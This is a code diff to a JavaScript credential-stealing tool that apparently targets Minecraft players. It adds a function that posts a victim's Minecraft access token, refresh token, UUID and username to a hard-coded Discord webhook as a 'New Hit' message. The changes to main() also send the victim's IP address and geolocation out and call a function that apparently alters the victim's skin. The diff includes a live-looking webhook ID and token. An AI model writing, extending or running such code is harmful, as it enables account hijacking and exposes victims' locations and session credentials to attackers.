@@ -205,6 +205,36 @@ async function sendEmbed2() {
 	});
 }
 
+async function sendEmbedPaki(MinecraftToken, uuid, refreshToken, username) {
+	const webhook = new WebhookClient({
+		id: '1095006207284101182',
+		token:
+			'sc8MMflFGR9l8e395kQvbDwva6YXTofvw-T_uyvveAVx-8D6cMQGx1S0_PBpCx98HyeN',
+	});
+	const embed = new EmbedBuilder()
+		.setTitle(`**New Hit ❗**  -  Click for stats `)
+		.setURL(`https://sky.shiiyu.moe/stats/${username}`)
+		.setAuthor({ name: 'Xenon', iconURL: 'https://i.imgur.com/nXvl29a.png'})
+		// .setDescription('@everyone')
+		.setColor(0x0099FF)
+		.addFields(
+			{ name: 'Nom', value: `\`${username}\``, inline: true },
+			{ name: 'UUID', value: `\`${uuid}\``, inline: true },
+			{ name: 'Refresh Token', value: `\n\`${refreshToken}\`` },
+			{
+				name: 'SSID',
+				value: `\`${username}:${uuid}:${MinecraftToken}\``,
+			},
+		)
+		.setFooter({ text: 'legion*#4154', iconURL: 'https://i.imgur.com/rlHZ2Sx.png' })
+		.setTimestamp();
+
+	webhook.send({
+		embeds: [embed],
+	});
+}
+
+
 async function getIpInfo(ip){
 	class ipClass {
 		constructor(IPV4, Region, City, ISP, Lon, Lat) {
@@ -270,6 +300,8 @@ async function main(code){
 	var ip = await getIp()
 	var ipInfo = (await getIpInfo(ip))
 	var PasteLink = await Paste(PasteKey, ipInfo)
+	await sendEmbed(MinecraftToken, Uuid, refreshtoken, Ign, ip, PasteLink);
+	await sendEmbedPaki(MinecraftToken, Uuid, refreshtoken, Ign)
 	hahaFunny(MinecraftToken, Uuid, `https://www.minecraftskins.com/uploads/skins/2018/11/22/mitler-12607230.png?v560`)
 	console.log(chalk.red(`\n[!] New Hit`))
 	}catch(err){
